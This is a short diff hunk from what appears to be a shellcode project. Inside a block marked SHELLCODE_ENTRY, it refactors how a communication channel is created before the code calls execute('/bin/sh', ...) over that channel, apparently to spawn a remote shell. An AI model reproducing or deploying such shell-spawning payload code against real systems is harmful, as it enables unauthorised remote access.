@@ -12,7 +12,7 @@ SHELLCODE_ENTRY {
 #endif
     char *const envp[] = { NULL };
 
-    struct channel chan = get_communication_channel();
-    execute("/bin/sh", argv, envp, chan);
+    Channel channel;
+    execute("/bin/sh", argv, envp, channel);
 
 } SHELLCODE_END
